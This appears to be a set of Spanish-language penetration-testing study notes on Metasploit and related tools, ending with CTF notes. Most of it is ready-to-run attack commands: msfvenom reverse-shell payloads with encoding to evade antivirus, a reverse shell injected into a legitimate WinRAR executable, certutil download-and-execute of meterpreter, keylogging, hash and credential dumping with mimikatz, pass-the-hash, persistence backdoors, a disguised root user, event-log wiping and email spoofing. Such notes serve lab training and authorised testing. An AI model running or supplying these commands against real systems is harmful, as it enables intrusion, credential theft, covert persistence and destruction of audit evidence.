	
-----
>Aquí encontramos la info relacionada en el S.O **/usr/share/metasploit-framework/**

## Módulos
1. **NOPS:** se usan para asegurar la funcionalidad y tamaño de los payloads
	- Rutas
```bash
/sur/share/metaslpoit-framework/modules
~/.ms4/modules
```

- Lanzamos
```bash
service postgresql start
msfdb run
# Interfaz principal
msfconsole
```
## Organización

- Hacer directorio de trabajo
```bash
workspace -h
workspace -a carpetaza
workspace carpetaza
```

 - Puedo importar en formato **-oG nmap** o **-oX** en xml lo pilla
```bash
db_import rutaoGnmap
hosts
services
vulns
```


## Búsqueda
- Buscar por **SO**
```bash
search platform:"windows"
```

- Buscar por tipo de payload
```bash
search type:"exploits"
```

- Buscar por **CVE**
```bash
search cve:2017
```
- Hosts o servicios activos
```bash
hosts
services
```

- Opción para conectarse, parecido a **netcat**
```bash
connect -h
connect 192.168.1.1 21
```

- Ver payloads, en **msfvenom** también
```bash
show all
show payloads
msfvenom -l encoders
```

- Ver que puedo cargar
```bash
load -l
```
- Las reverse shells de metasploit llevan **meterpreter** en el nombre de sus payloads

## Enumeración

- Pendientes de enumerar todas la sinterfaces
```
ifconfig
ip a
cat /proc/net/arp 
arp -n 
arp -a
```
- Añadir una ruta después de descubrir otra **red** (DENTRO DE **meterpreter**)
```bash
meterpreter> run autoroute -s 192.168.12.5
``` 
- Módulos de escaneo **TCP y UDP**
```bash
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/discovery/udp_sweep
```

### SMB
----
>**Ports:**  **139** Netbios o **445**

1. Utilizamos auxiliares como smb_version
2. Utilizamos auxiliary/scanner/smb/smb_enumusers
3. Utilizamos auxiliary/scanner/smb/smb_enumshares
4. Utilizamos  smb_login y la wiordlist d eunix_users en /usr/share/metasploit/data/wordlist

```bash
smbclient \\\\IP\\ -U admin

get archivo
```

### WebServer Enum

- Módulos utilizados
```bash
search type:auxiliary name:http
```

- Explotation
```
http_version
http_header
dir_scanner
# Utiliza el siguiente directorio para el fuzzing de archivos
/usr/share/metasploit-framework/data/wmap/wmap_files.txt
files_dir
apache_userdir_enum
http_login
```
- si existe la versión **HTTPFileServer httpd 2.3**
```bash
search rejetto
```
### MYSQL

> Si tienes este servicio corriendo y has conseguido explotar una vuln para leer archivos lee este por si hay leaks **/home/admin/.mysql_hist**
- Módulos utilizados
```bash
search type:auxiliary name:sql
```

- Explotation
```bash
mysql_login --> root como default user
# Enumerar datos de la BD
mysql_enum
# Ejecuta querys mientras te autentiques
mysql_sql
# Dumpea las BD
mysql_schemadump
```

- Comandos
```bash
# Nos dice la info que tenemos
loot
# Nos dice las credens que tenemos
creds
# Fuera de MSF entramos en MYSQL
mysql -h IP -u root -p
```

### SSH

- Módulos
```bash
search type:auxiliary name:ssh
```

- Explotation
```bash
ssh_version
# Importante pasar esta
ssh_enumusers
ssh_login
```

### SMTP

>Puertos 25,465 oo 587

- Módulos
```bash
search type:auxiliary name:smtp
```

- Explotation
```bash
smtp_version
smtp_enum

telnet domain puerto
HELO dominioquetedigan.xzy
VRFY admin@openmailbox.xyz

# Verificamos usuarios
smtp-user-enum -M VRFY o RCPT -t demo.ine.local -U /usr/share/commix/src/txt/usernames.txt 

#Mandamos email impersonando a alguien
telnet 192.168.1.149 25

MAIL FROM:sexo

RCPT TO:root
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject:rot esto pa ti
EEEH primazo, me comes to el cazo
.
250 2.0.0 Ok: queued as ED0B8BAC1
quit
```

### Vulnerability Scanning

1. Nmapeamos todas las versiones de todos los servicios que correo por todos los puertos
2. Buscamos exploits de esas versiones en **metasploit** o **searchsploit**
```bash
search type:exploit name:servicio version
```
3. **metasploit-autopown** - Debemos tener toda la info enumerada
```bash
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/refs/heads/master/db_autopwn.rb
mv db_autopwn.rb /usr/share/metasploit-framework/plugins
msf6> load db_autopwn
msf6> db_autopwn
msf6> db_autopwn -t -p -PI 465
msf6> analyze
msf6> vulns
```

### Nessus

>Los **.nessus** también los procesa

```bash
db_import ruta.nessus
vulns -p 80
hosts
```

### WMAP

> Escanea y explota las apps Webs

- Iniciar

```bash
load wmap
wmap_sites -h
# añade un sitio
wmap_sites -a IP
# Setea los targets
wmap_targets -t url
# Intentamos petar
wmap_run -h
wmap_run -t --> Vemos todos los módulos
wmap_run -e --> lanzamos
# Listamos vulns
wmap_vulns -l
```

## Msfvenom

- Listar posibles payloads
```bash
msfvenom -l payloads
msfvenom -l formats
```

- Crear un buen payload ahí, que me abra paso a hackear la NASA
```bash
# 32 bits Windows
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/Windows/Payloads/payloadx86.exe

# 64 bits Windows
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/Windows/Payloads/payloadx64.exe

# 32 Bits linux
msfvenom  -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > /home/kali/Desktop/Windows/Payloads/payloadx32.exe

# 64 Bits linux
msfvenom  -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > /home/kali/Desktop/Windows
Payloads/payloadx64.exe
```

- En metasploit
```bash
use multi/handler
set payload linux/x64/meterpreter/reverse_tcp 
```

### Encoding

>Encodear sirve para esconder las anteriores firmas ya que algunos de los **AV**, utilizan un sistema de detección de firmas

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 5 -f exe > ~/Desktop/Windows_Payloads/encode.exe
```

- Importante encodear con iteraciones
>**-e:** elige encoder

>**-i:** especificas el número de iteraciones, aunque el tamaño aumenta

- En metasploit
```bash
use multi/handler
set payload linux/x64/meterpreter/reverse_tcp 
```
### Injection payloads into windows programms (portable executable)

- Inyectaremos un payload dentro de un ejecutable legit como winrar

> **-k:** Hay algunos

1. Hemos escogido winrar para inyectar el payload pero en ese programa no se puede
```bash
msfvenom -a x64 -p windows/shell_reverse_tcp LHOST=192.168.1.135 LPORT=443 -e x64/zutto_dekiru -i 15 -x winrar-x64-711es.exe -k  -f exe > winrarFunc.exe
#x86
msfvenom -a x86 -p windows/shell/reverse_tcp  LHOST=192.168.1.135 LPORT=443 -e x86/shikata_ga_nai -i 15 -x winrar-x64-711es.exe -k  -f exe > winrarFunc.exe

#Vemos como el archivo pasa como si fuese legit viendo las porpiedades, sin -k
msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.1.135 LPORT=443 -e x86/shikata_ga_nai -i 15 -x winrar-x64-711es.exe  -f exe > winrarFunc.exe
```

2. Algunos procesos pueden ser parados por windows, por lo que migraremos de proceso

```bash
meterpreter > run post/windows/manage/migrate
```

### Automating scripts

>La ruta está en **/usr/share/metasploit-framework/scripts/resource**, están programados en ruby

- Script **archivo.rc**
```bash
use multi/handler
set rhosts IP
Y lo que queramos para automatizarlo
```

- Los comandos que haya utilizado los puedo guardar con el siguuiente comando
```bash
mf6> makerc ruta.rc
# Ver los comandos que he ejeuctado
exit 
cat ruta.rc
```

- Ejecutar
```bash
msfconsole -r archivo.rc

# Dentro de Metasploit se ejecuta
resource ruta.rc
```
## Explotación

- con el comando check podemos ver si es vulnerable, mandanodo una pequeña traza
- Listamos todo lo que podamos,nos dan un payloa dpor defecto, darle el más adecuado 

```bash
show options
info
```
- Nos darán un target por defecto, le damos el que mejor se adapte
```bash
show targets
set target 0
```

- Usar módulos
```bash
user auxiliar
```

- Recibir una consola de **PS**
```
load powershell
powershell_shell
```
- Keylogger
```bash
keyscan_start
keyscan_dump
keyscan_stop
```

- hashes
```
hashdump
```

- Listar credenciales con **mimi** desde la memoria (que es lo que hace mimi jeje)

```bash
load kiwi
# Recopila las passwds dentro del módulo de mimi
--> creds_all
```

### MS17-010 - Eternalblue SMBv1 

>Colección de vulnerbailidades Windows que nos dejan ejecutar código ahí jeje
>Es una vulnerabilidad del servicio SMB que permite ejecutar código 

- El ejemplo se ha hecho con windows 7, ha de tener abiertos los puertos **139 y 445**

>**En metasploit **

```bash
# Checkear si es vulnerable
use scanner/smb/smb_ms17_010

show options
Check_ARCH true
CHECK_DOPU true
```

- Explotar
```bash
search type:epxloit EternalBlue
use 0
set lo que sea 
run
```

###  WinRM (Windows Remote Management Protocol)

>Trabaja con los puertos :
>**TCP --> 5985**
**>HTTP --> 5986**

- Si hay servicio winRM expuesto, **verificar los users**
- Auxiliares 
```bash
winrm_auth_methods --> recopila el método d eautenticación
winrm_login
```

- Exploits
```bash
set FORCE_VBS true
windows/winrm/winrm_script_exec
```

### Tomcat

>Hecho para Albergar WebApps hechas en  **Java**

- Exploits
```bash
exploit/multi/http/tomcat_jsp_upload_bypass
set shell cmd
# Marcar a que so le tiramos la vaina bacana
info o show options
```

- Descargar desde la víctima (Windows)
```cmd
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > meterpreter.exe
certutil -urlcache -f http://192.168.1.135/meterpreter.exe meterpreter.exe
meterpreter.exe
```

### FTP

> La versión  **v2.3.4** es **vulnerable a command injection**, podemos insertar una **backdoor**

```bash
# Una vez ganado acceso desde metasploit y queremos meterpreter
search shell_to_meterpreter
use 0
# Configuramos y lanzamos
```
### SMB

>Samba versión **3.5.0** es vulnerable a ejecución de código, se puede subir una librería y que el servidor la cargue, donde el directorio tenga permisos de escritura

- Exploit
```bash
exploit/linux/samba/is_known_pipename

set rhost demo.ine.local
exploit
```

### SSH

> La versión protocol 2 **libssh**  es vulnerable

- Exploit
```bash
scanner/ssh/libssh_auth_bypass
set spawn_pty true
# aparecerá una shell
```

### SMTP

>Haraka es un servidor SMTP desarrollado en node.js, es vulnerbale por un plugin que procesa los adjuntos, las versiones anteriores a v2.8.9 es vulnerable a inyección de comandos

- Exploit
```bash
set payload linux/x64/meterpreter_reverse_http
```

## Post-explotation

>Hay distintas fases

1. Elevación de privilegios
2. Persistencia
3. Borrar rastro
### Meterpreter

>Se ejecuta en memoria a través de una DLL

- Para movernos entre directorios **IMPORTANTE**
```bash
lcd /root/Desktop
# Para listar donde nos hemos movico, NO ll
lls
```
- Move una **shell a meterpreter**
```bash 
use post/multi/manage/shell_to_meterpreter
set session 1 
run

# Automatizar el process
sessions -u 1
```
- sessions
```bash
#Lanzar un comando rápido sin entrar a la sesión
sessions -C sysinfo -i 1
```
- Para editar un archivo , como con **nano**
```bash
edit archivo
```
- Para descargar
```bash
download archivo
back
unzip archivo
```
- Ver $PATH
```bash
getenv PATH
getenv ENV
```

- Buscar archivos
>**-d:** directorio **-f:** cadena
```bash
search -d /usr/bin/ -f *backdoor*
# Así te la ruta dónde se encuentra
search -f *.jpg
```

- Abrir terminal
```bash
/bin/bash -i 
```

- Migrar de procesos
```bash
ps
migrate pid
```
- Elevar privilegios
```bash
#Elevar privilegios y si vemos SeImpersonatePrivileg
getprivs 
getsystem
```
### Windows Post-Explotation

>Podemos enumerar lo siguiente

1. users Logeados
2. VMachines
3. Anti Virus
4. Programas instalados
5. Compartición de archivos


- Con el help en linux tendemos diferentes comandos
```bash
sysinfo
getuid
help
```
- Identificar privilegios
```bash
windows/gather/win_privs
```

- Enumerar users que están logeados 
```bash
post/windows/gather/enum_logged_on_users
set session 
run
```
- Enumerar Apps
```bash
post/windows/gather/enum_logged_on_users
set session 1 
run
```
- Enumerar AntiVirus o carpetas que están excluidas JEJEJEJE
```bash
post/windows/gather/enum_av
post/windows/gather/enum_av_excluded
```
- Enumeramos dominio y actualizaciones
```bash
enum_computers
enum_patches
# O en la shell, te da todos los parches
systeminfo
```
- Enumerar compartición de archivos
```bash
enum_shares
```
- Enumerar **RDP**
>Puerto **3389**, se ve en **nmap**  como **ms-wbt-server**
```bash
enable_rdp
```
- Enumerar Users desde la shell
```bash
Net users
# Que users pertenecen a administrator
net localgroups administrators
```
- Elevar privilegios
```bash
getprivs 
getsystem
getuid
```

- UAC bypass
```bash
# Una vez hemos ganado meterpreter
search type:payload uac_injection
set session 1
use payload/windows/x64/meterpreter/reverse_tcp
back 
session 2
getsystem
getuid 
hashdump
```

- Windows Access Token, incognito
> Creados y Administrados por **lsass.exe**

> Identifica la seguridad de los procesos

>Son generados por **Winlogon.exe**, incluye la identidad y privilegios de la cuenta asociada al proceso

>Después se asocia con un **user.init** el cuál replica todos los privilegios del proceso padre

> Los siguientes privilegios los necesitaremos para impersonar a un user:

1. **SelmpersonatePrivilege:**
2. **SeCreateToken:**
3. **SeAssignPrimaryToken:**
> Explotación

```bash
load incognito
list_tokens -u
impersonate_token "COPIAMOS EL QUE SALE EN DELEGATION"
ps
migrate "PID de un proceso con PRIVILEGIOS el IMPERSONATE TOKEN"
getsystem
hashdump
```

- Mimikatz

> En el director **/usr/share/windows-resources/x64/mimikatz.exe** --> también tenemos el de x32

>Podemos subirle mimi y ejecutar desde ahí

```bash
#Buscar proceso en particular
pgrep lsass
migrate "numero lsass"
getsystem
load kiwi
help
lsa_dump_secrets
lsa_dump_sam
creds_all
upload /usr/share/windows-resources/x64/mimikatz.exe
shell
./mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
```

- Pass The Hass - **PTH** con **PsExec**
```bash
pgrep lsass
migrate "pid lsass"
getsystem
hashdump
search psexec
use scanner/smb/smb_login
set SMBUser Administrator (O la cuenta más privilegiada)
set SMBPass NTLM:HASH --> Hash NTLM puede ser la clear pass
exploit
```

- **Persistence** in windows
```bash
search type:exploit platform:windows persistence
use windows/local/persistence/service
set session 1
exploit
#Si pone qu eno soporta un payload staged se lo cmabiamos por "windows/meterpreter/reverse_tcp"

# Si borrramos las sesiones
use multi/handler
set lport --> el mismo que en el módulo de persistencia
set lhost eth1
set payload windows/meterpreter/reverse_tcp --> el mimso paylad que en persistencia
run
```

- Enabling **RDP**
>Utiliza el puerto **3389**

>Se ve en **nmap**  como **ms-wbt-server**

>**Necesitamos autenticación** como user y password

```bash
search platform:windows enable_rdp
use 0
set session 1
exploit
session 1
shell
net user Administrator LecambiamoslaPasswd
# En una terminal 
xfreerdp /u:administrator /p:LecambiamoslaPasswd /v:IP
```

- Windows **Keylogging** - Capturing Keystroke
```bash
# Imprtante migrar a este proceso porque por alguna razón funciona mal en el resto
pgrep explorer
keyscan_start
keyscan_dump
# Si no captura reiniciamos el keylogger y volvemos a dumpear
```

- Clearing Windows Event Logs - Fulminamos los logs para que no nos calene
> Tipos de Eventos
1. Apps Logs
2. System Logs
3. Security Logs

> Son accesibles desde **Event logs** de windows

```bash
meterpreter> clearev --> te wipea hasta la vida
```

### Linux Post-Explotation

>Lo primero que haremos será **/bin/bash -i** para ganar una shell
- Enumerar users
```bash
cat /etc/passwd | grep -Fi "sh"
```
- Enumerar SO
```bash
uname -a
```

- Enumerar que puertos tienen servicios corriendo
```bash
netstat -antp
```
- Enumerar **$PATH**
```bahs
env
echo $PATH
```

- Enumerar configuraciones
```bash
# Checkear si estamos en una VM o contenedor
search cehckvm
search checkcontainer
# Checkear info de interés
search enum_configs
search enum_network
search enum_protection
search enum_system
exploit
# Una vez hemos recopilado toda la info
loot
notes
cat unadelasrutas
# Servicios
# Certificados
# Ldap
# Shells Válidas
search enum_network
search enum_protection
search enum_system
```

- Elevación de privilegios
>En  este caso upgrademos una sesión a meterpreter
```bash
session -u
```

> **VULN a ESCALADA DE PRIVS:** Si el target posee **chkrootkit 0.50 corriendo o menor**, si se guarda como ejecutable o hay una tarea programada ejecutándose

```bash
# En la shell 
ps -aux
chkrootkit -v
# en MSF
search chkrootkit
set chkrootkit PATHenlaVictim
```

- Dumping Hashes - Hashdump
>Trataremos de dumpear los hashes de **/etc/shadow**

```bash
search hashdump
```
### Pivoting

1. Si comprometemos, sólo podremos **escanear desde dentro de metasploit**
- Al comprometer runa máquina añadiremos Rutas
```bash
meterpreter> run autoroute -s DirRed/Mascara
# renombramos las sesiones para que nos queden claras las redes
sessions -n Red1-Victim1 -i 1
```
- Scanner **TCP**
```bash

use scanner/portscan/tcp
set rhosts IPVictim2
set PORTS 0-65535
exploit
```
- Para **forwarding** 
> **-l:** Especificamos el puerto de la máquina atacante
    **-p:** Especificamos el port de la vítcima
     **-r:** Especifico la áquina Víctima
 
```bash
meterpreter>portfwd add -l 1234 -p 80 -r IPVictim2
```

- Escaneamos por el puerto dónde reenviamos, a ver que info de cada port
```bash
db_nmap -sS -sV -p 1234 localhost
```

 - Explotación
 >Abremos bind_shell y la víctima abre el Peuerto esperando conexiones

```bash
use elexploit que sea en ese puerto 80
set payload /windows/meterpreter/bind_tcp
set rhosts IPVictim2
set lport otrodifeente al del priemr pivoting
```
### Persistencia - Backdoors

>Configuraremos un módulo para que cada tanto tiempo, nos otorge una reverse shell siempre que estemos escuchando
- LLevar una session a **background**
```bash
background
```
- Ver módulos de persistencia
```bash
search persistence platform:"windows"
use modulo
session
set session 1
```

- cuándo ejecutamos con **run**, crea un servcio nuevo
- Creamos listener (**imaginando que nos hemos slaido de metasploit**)
```bash
msfdb run
use /multi/handler
set payload windows/meterpreter/reverse_tcp
# La sesión de persistencia tratará de conectar cada tanto (lo que configures con set)
run
```

#### Otra forma de Persistencia
>Podemos crear un user llamándolo como un proceso para que no nos calen (**uno que no se ha instalado **)

- Una vez ganado acceso y privilegios
```bash
useradd -m ftp -s /bin/bash
passwd ftp
# AÑadimos ftp al grupo root
groups root
usermod -aG root ftp
# Darle un id al grupo que se ve en /etc/passwd 
usermod -u 15
groups ftp
```

- Usamos módulo que queramos
```bash
search apt_package_manage_persistence
search cron_persistence
search service_persistence
```
- Después de crear la cuenta ftp, generamos el par de claves pera generar persistencia
```bash
search post/linux/manage/sshkey_persistence
set CHKROOTKIT /bin/chkrootkit
run
# copiamos clave privada que nos crea
# en Terminal local
nano ssh_key
chmod ssh_key
ssh -i ssh_key root@ip


```

## Armitage
---
> **Versión gráfica** de MSF

- Iniciamos la BD y msfconsole
```
sudo msfdb run
```

## Powershell Empire

----

>Es un framework de **explotación y post-explotación**  de Powershell que no necesita powershell.exe sobre todo para explotar windows, tiene todo de manera centralizada como **mimi**, keyloggers o detección de tecnología


- Instalación y preparación
```
sudo apt install powershell-empire starkiller -y
 powershell-empire server
  powershell-empire client
```

- Listar
```bash
agents
listeners
```

- Primero creamos un listener en **starkiller**
```URL
http://localhost:1337
empireadmin:password123
```

>**Listeners:** Ejecutaremos los listeners para recibir las conexiones
>**Stagers:** configuramos los exploits para mandárselos a la víctima y ejecutarlos
>**Agent:** apartado dónde vemos nuestras víctimas envenenadas




## CTF  MSSQL

- Después de una sesión de meterpreter
```bash
# Windows
# Filtra sólo los folders
dir /a:d
dir *flag*.txt /b /s
#Elevar privilegios y si vemos SeImpersonatePrivileg
getprivs 
getsystem
```

## CTF2 RSYNC

- Nos hemos abierto paso con rsync y hemos descargado archivos 

```bash
rsync rsync://192.168.1.100:873/archivo directorio
```

- Y nada simplemente he visto el banner de sitio web y he mirado si en metaspoloit había algún xploit,
- Directamente ya hemos ido buscando la flag por lo directorios con acceso ganado vía meterpreter
```bash
# para ir más cómodos en meterpreter
/bin/bash -i 
```
